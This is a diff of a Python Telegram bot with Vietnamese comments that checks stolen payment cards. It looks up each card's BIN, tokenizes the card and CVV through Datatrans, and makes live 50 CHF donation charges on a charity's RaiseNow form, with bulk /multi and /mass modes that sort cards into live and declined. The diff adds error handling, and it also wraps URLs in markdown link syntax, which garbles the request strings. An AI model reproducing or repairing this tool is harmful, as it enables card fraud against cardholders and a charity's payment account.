@@ -149,7 +149,9 @@ def update_user_stats(user_id, user_info, counts):
 
 # --- CÁC HÀM CỐT LÕI ---
 
-def make_request_with_retry(session, method, url, max_retries=10, **kwargs):
+# *** FIX LỖI TIMEOUT ***
+# Giảm số lần thử lại để tránh thời gian chờ quá lâu
+def make_request_with_retry(session, method, url, max_retries=5, **kwargs):
     last_exception = None
     for attempt in range(max_retries):
         try:
@@ -209,7 +211,7 @@ def check_card(line):
 
     try:
         bin_to_check = cc[:6]
-        bin_url = f"https://bins.antipublic.cc/bins/{bin_to_check}"
+        bin_url = f"[https://bins.antipublic.cc/bins/](https://bins.antipublic.cc/bins/){bin_to_check}"
         bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
         bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10)
         
@@ -226,12 +228,15 @@ def check_card(line):
             except json.JSONDecodeError:
                 logger.warning(f"Lỗi phân tích JSON từ BIN check cho BIN {bin_to_check}")
 
-        if bin_info.get('country_name', '').upper() == 'VIETNAM':
+        # *** FIX LỖI NONETYPE ***
+        # Xử lý trường hợp `country_name` là `None` (JSON `null`)
+        country_name_str = bin_info.get('country_name') or ''
+        if country_name_str.upper() == 'VIETNAM':
             return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
             
-        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+        tokenize_url = "[https://pay.datatrans.com/upp/payment/SecureFields/paymentField](https://pay.datatrans.com/upp/payment/SecureFields/paymentField)"
         tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
-        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
+        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "[https://pay.datatrans.com](https://pay.datatrans.com)", "Referer": "[https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8](https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8)", "X-Requested-With": "XMLHttpRequest" }
         
         token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
         if error: return 'error', line, f"Lỗi Tokenize: {error}", bin_info
@@ -245,9 +250,9 @@ def check_card(line):
         except json.JSONDecodeError:
             return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
         
-        payment_url = "https://api.raisenow.io/payments"
-        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result" }
-        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
+        payment_url = "[https://api.raisenow.io/payments](https://api.raisenow.io/payments)"
+        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4575-b32a-b4171f9a8b8c", "name": "Books for Change Spendenformular", "type": "donate"}, "product": {"name": "tamaro", "source_url": "[https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en](https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en)", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5", "return_url": "[https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result](https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en&rnw-view=payment_result)" }
+        payment_headers = { "Content-Type": "application/json", "Origin": "[https://donate.raisenow.io](https://donate.raisenow.io)", "Referer": "[https://donate.raisenow.io/](https://donate.raisenow.io/)" }
         
         payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20)
         if error: return 'error', line, f"Lỗi Payment: {error}", bin_info
@@ -536,7 +541,7 @@ async def bin_command(update, context):
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         session.headers.update({"User-Agent": ua})
         
-        bin_url = f"https://bins.antipublic.cc/bins/{bin_to_check}"
+        bin_url = f"[https://bins.antipublic.cc/bins/](https://bins.antipublic.cc/bins/){bin_to_check}"
         bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)
 
         if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text:
@@ -545,11 +550,12 @@ async def bin_command(update, context):
 
         bin_info = bin_response.json()
 
-        brand = bin_info.get('brand', 'N/A').upper()
-        card_type = bin_info.get('type', 'N/A').upper()
-        level = bin_info.get('level', 'N/A').upper()
-        bank = bin_info.get('bank', 'None')
-        country_name = bin_info.get('country_name', 'N/A').upper()
+        # *** FIX LỖI NONETYPE ***
+        brand = (bin_info.get('brand') or 'N/A').upper()
+        card_type = (bin_info.get('type') or 'N/A').upper()
+        level = (bin_info.get('level') or 'N/A').upper()
+        bank = bin_info.get('bank') or 'None' # Bank name shouldn't be uppercased
+        country_name = (bin_info.get('country_name') or 'N/A').upper()
         country_code = bin_info.get('country_code')
         flag = get_flag_emoji(country_code)
 
@@ -614,11 +620,12 @@ async def cs_command(update, context):
             }
             status_text, response_message = status_map.get(status, status_map['unknown'])
             
-            brand = bin_info.get('brand', 'N/A').upper()
-            card_type = bin_info.get('type', 'N/A').upper()
-            level = bin_info.get('level', 'N/A').upper()
-            bank = bin_info.get('bank', 'None')
-            country_name = bin_info.get('country_name', 'N/A').upper()
+            # *** FIX LỖI NONETYPE ***
+            brand = (bin_info.get('brand') or 'N/A').upper()
+            card_type = (bin_info.get('type') or 'N/A').upper()
+            level = (bin_info.get('level') or 'N/A').upper()
+            bank = bin_info.get('bank') or 'None'
+            country_name = (bin_info.get('country_name') or 'N/A').upper()
             country_code = bin_info.get('country_code')
             flag = get_flag_emoji(country_code)
             
@@ -630,11 +637,21 @@ async def cs_command(update, context):
                 f"🏛️ **Bank:** {bank}\n"
                 f"🌐 **Country:** {country_name} {flag}"
             )
+            
+            # *** FIX LỖI PARSE ENTITIES ***
+            # Sử dụng khối code (```) cho các phản hồi có thể gây lỗi Markdown
+            response_display_part = ""
+            if status in ['invalid_format', 'error', 'unknown']:
+                safe_response = str(response_message)[:1000] # Cắt bớt tin nhắn lỗi quá dài
+                response_display_part = f"**💬 Response:**\n```\n{safe_response}\n```"
+            else:
+                response_display_part = f"**💬 Response:** `{response_message}`"
+
 
             final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                              f"**💳 Card:** `{original_line}`\n"
                              f"**🚦 Status: {status_text}**\n"
-                             f"**💬 Response:** `{response_message}`\n\n"
+                             f"{response_display_part}\n\n"
                              f"ℹ️ **BIN Info:**\n{bin_details_str}\n\n"
                              f"**🏦 Gateway:** `Charge 0.5$ Auth Api`\n\n"
                              f"**⏱️ Took:** `{duration:.2f}s`\n\n"
@@ -644,7 +661,9 @@ async def cs_command(update, context):
         
     except Exception as e:
         logger.error(f"Lỗi trong /cs: {e}", exc_info=True)
-        await msg.edit_text(f"⛔️ **System Error:** `{e}`")
+        # Bọc lỗi trong khối code để tránh lỗi parse entities thứ cấp
+        safe_error_message = str(e).replace('`', "'")
+        await msg.edit_text(f"⛔️ **System Error:**\n```\n{safe_error_message}\n```")
 
 
 async def multi_check_command(update, context):
@@ -711,9 +730,14 @@ async def multi_check_command(update, context):
                     if status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE':
                         result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED`"
                     elif status == 'invalid_format':
-                        result_line = f"{status_icons[status]} `{original_line}` | Lý do: {full_response}"
+                        result_line = f"{status_icons[status]} `{original_line}` | Lý do: {str(full_response)[:50]}" # Truncate to prevent errors
                     else:
-                        bin_str = f"{bin_info.get('bank', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} - {bin_info.get('country_name', 'N/A')}"
+                        # Handle potential None values from bin_info
+                        bank_str = bin_info.get('bank') or 'N/A'
+                        type_str = bin_info.get('type') or 'N/A'
+                        brand_str = bin_info.get('brand') or 'N/A'
+                        country_str = bin_info.get('country_name') or 'N/A'
+                        bin_str = f"{bank_str} - {type_str} - {brand_str} - {country_str}"
                         result_line = f"{status_icons.get(status, '❔')} `{original_line}` | `{bin_str}`"
 
                     results[status].append(result_line)
@@ -734,8 +758,12 @@ async def multi_check_command(update, context):
                     )
                     try:
                         await status_message.edit_text(text=status_text)
-                    except telegram.error.BadRequest:
+                    except telegram.error.BadRequest as e:
+                        if "Message is not modified" not in str(e):
+                            logger.warning(f"Lỗi khi cập nhật tiến trình /multi: {e}")
                         pass
+                    except Exception as e:
+                        logger.error(f"Lỗi không xác định khi cập nhật tiến trình /multi: {e}")
                     last_update_time = time.time()
         
         duration = time.time() - start_time
@@ -769,7 +797,8 @@ async def multi_check_command(update, context):
 
     except Exception as e:
         logger.error(f"Lỗi trong /multi: {e}", exc_info=True)
-        await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!** `{e}`")
+        safe_error_message = str(e).replace('`', "'")
+        await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!**\n```\n{safe_error_message}\n```")
     finally:
         if user.id != ADMIN_ID:
             ACTIVE_CHECKS.discard(user.id)
@@ -860,7 +889,11 @@ async def mass_check_handler(update, context):
                     elif status == 'invalid_format':
                         line_to_save = f"{original_line} | Reason: {full_response}"
                     else:
-                        bin_str = f"| {bin_info.get('bank', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} - {bin_info.get('country_name', 'N/A')}"
+                        bank_str = bin_info.get('bank') or 'N/A'
+                        type_str = bin_info.get('type') or 'N/A'
+                        brand_str = bin_info.get('brand') or 'N/A'
+                        country_str = bin_info.get('country_name') or 'N/A'
+                        bin_str = f"| {bank_str} - {type_str} - {brand_str} - {country_str}"
                         line_to_save = f"{original_line} {bin_str}"
                     
                     result_lists[status].append(line_to_save)
@@ -885,8 +918,14 @@ async def mass_check_handler(update, context):
                                    f"🔒 **3D Secure:** `{counts['custom']}`\n"
                                    f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
                                    f"❔ **Errors:** `{counts['error']}`")
-                    try: await status_message.edit_text(text=status_text)
-                    except telegram.error.BadRequest: pass
+                    try: 
+                        await status_message.edit_text(text=status_text)
+                    except telegram.error.BadRequest as e:
+                        if "Message is not modified" not in str(e):
+                            logger.warning(f"Lỗi khi cập nhật tiến trình /mass: {e}")
+                        pass
+                    except Exception as e:
+                        logger.error(f"Lỗi không xác định khi cập nhật tiến trình /mass: {e}")
                     last_update_time = time.time()
         
         duration = time.time() - start_time
@@ -930,7 +969,8 @@ async def mass_check_handler(update, context):
 
     except Exception as e:
         logger.error(f"Lỗi trong mass_check: {e}", exc_info=True)
-        await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!** `{e}`")
+        safe_error_message = str(e).replace('`', "'")
+        await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!**\n```\n{safe_error_message}\n```")
     finally:
         if user.id != ADMIN_ID:
             ACTIVE_CHECKS.discard(user.id)
